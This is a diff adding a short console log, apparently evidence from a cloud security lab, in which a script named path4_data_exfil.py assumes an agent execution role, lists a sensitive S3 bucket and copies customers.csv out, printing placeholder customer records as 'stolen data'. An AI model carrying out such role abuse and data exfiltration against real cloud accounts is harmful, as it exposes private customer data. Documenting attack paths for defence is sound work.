@@ -1,0 +1,12 @@
+PS> python attacks\scripts\path4_data_exfil.py
+[*] operating as: assumed-role/cloudfracture-agent-exec-role/cf-exfil
+[*] target bucket: cloudfracture-sensitive-data-000000000000
+[*] enumerated 1 object(s): ['customers.csv']
+    [+] exfiltrated customers.csv (224 bytes)
+[+] exfiltrated 224 bytes -> attacks/evidence/path4/exfiltrated/
+[+] sample of stolen data:
+    id,name,email,plan,mrr
+    1,Ada Lovelace,ada@example.invalid,enterprise,4200
+    2,Alan Turing,alan@example.invalid,pro,890
+    3,Grace Hopper,grace@example.invalid,pro,890
+    4,Katherine Johnson,katherine@example.invalid,enterprise,5100
